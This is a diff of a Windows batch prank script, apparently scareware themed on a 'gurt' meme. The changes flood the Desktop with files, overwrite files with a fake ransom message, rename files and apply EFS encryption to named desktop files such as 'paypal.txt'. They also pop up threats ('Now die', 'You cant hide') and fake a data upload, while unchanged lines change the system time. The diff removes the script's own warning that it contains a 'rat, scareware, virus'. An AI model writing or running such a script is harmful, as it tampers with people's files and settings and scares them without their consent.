@@ -43,8 +43,8 @@ echo.
 
 pause
 
-echo getting ready for the song
-start https://www.youtube.com/watch?v=EgqUJOudrcM
+echo get ready for the song
+start /min https://www.youtube.com/watch?v=EgqUJOudrcM
 echo DISCLAIMER: This script is being executed for educational purposes only.
 pause
 cls
@@ -53,14 +53,14 @@ setlocal enabledelayedexpansion
 
 
 
-set DEST=%USERPROFILE%\Desktop\gurt_sim_test
+set DEST=%USERPROFILE%\Desktop/secret
 if not exist "!DEST!" mkdir "!DEST!"
 
-for /l %%i in (1,1,5) do (
-    echo secret shoutout to slimyboigayali data %%i > "!DEST!\secret_file%%i.txt"
+for /l %%i in (1,1,10) do (
+    echo secret shoutout to slimyboigayali count %%i > "!DEST!\secret_file%%i.txt"
 )
 
-:: SIMULATE ENCRYPTION WITH CIPHER
+
 for %%f in ("!DEST!\*.txt") do (
     cipher /e "%%f"
 )
@@ -84,20 +84,19 @@ del "%POPUP%"
 
 
 cls
-echo Files encrypted: 5
+echo Files encrypted: idk
 ping localhost -n 2 > nul
 echo Your computer is under Gurt Surveillance.
 echo Resistance is futile.
 echo Now die.
-
+echo You cant hide.
 pause
 
 
-echo (why am i giving a warning now???)
-echo ts script has rat, scareware, virus,encrypter, copier and uhh gurtlings.
-echo press any key to die if not just close ts already
+goto loop
+:loop
 pause 
-for /l %%i in (1,1,10) do (
+for /l %%i in (1,1,30) do (
  echo ts pmo joe jack gurt:yo me:sybau %%i > "%USERPROFILE%\Desktop\gurts_day_today_%%i.txt"
 )
 
@@ -106,12 +105,38 @@ echo gurt:yo
 echo omg free robax pls pls yes yes !!!!!!!
 echo but am evil guy ahhah!11111111111
 echo me khili
-echo debug: sending random popups
-echo debug: but first lets encrypt real
- 
-cipher /e "%USERPROFILE%\Desktop\Important.txt"
-cipher /e "%USERPROFILE%\Desktop\Important.txt"
-cipher /e "%USERPROFILE%\Desktop\Important.txt"
+
+setlocal enabledelayedexpansion
+
+set "base=6r8$Fsj3@!9#4g1&8^aLx0pFZ73b"
+
+set count=0
+for %%f in ("yay - Kopi*.txt") do (
+    set /a count+=1
+    set "newname=!base!!count!.txt"
+    ren "%%f" "!newname!"
+)
+
+
+set DEST=%USERPROFILE%\Desktop/secret
+if not exist "!DEST!" mkdir "!DEST!"
+
+for /l %%i in (1,1,30) do (
+    echo Real important stuff %%i > "!DEST!\secret_file%%i.txt"
+)
+
+:: Simulate encryption by overwriting content
+for %%f in ("!DEST!\*.txt") do (
+    echo oh well your files got encrypted! 6r8$Fsj3@!9#4g1&8^aLx0pFZ73b > %%f
+)
+
+echo Bye
+
+
+
+cipher /e "%USERPROFILE%\Desktop\paypal.txt"
+cipher /e "%USERPROFILE%\Desktop\robuxinformation.txt"
+cipher /e "%USERPROFILE%\Desktop\vbucks giftcard.txt"
 
 
 powershell -Command "& {Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $notify = New-Object System.Windows.Forms.NotifyIcon; $notify.Icon = [System.Drawing.SystemIcons]::Information; $notify.Visible = $true; $notify.ShowBalloonTip(0, 'evil gurt:yo', 'furt: am evil gurt trust.', [System.Windows.Forms.ToolTipIcon]::None)}"
@@ -190,15 +215,18 @@ echo Changing system time...
 time 12:12:12
 start new_script.bat1
 ping localhost -n 2 >nul
+goto next2
 
+:next2
 echo @echo off > new_script2.bat
 cls
 echo Sending sensitive data to remote server...
 ping localhost -n 2 >nul
 echo Data sent: 2MB of gurt data
 start new_script.bat2
-ping localhost -n 2 >nul
+goto joemama!
 
+:joemama!
 echo MsgBox "gurtlings spawn and start flooding popups and pop and ups" >> %temp%\popup.vbs
 
 echo @echo off > new_script3.bat
@@ -226,12 +254,9 @@ start new_script.bat3
 
 
 
+echo MsgBox "gurtlings spawn and start flooding popups and pop and ups" >> %temp%\popup.vbs
 
 
-echo pause >> new_script.bat
-echo pause >> new_script1.bat
-echo pause >> new_script2.bat
-echo pause >> new_script3.bat
 
 echo i cast necromancy
 echo RISE!!
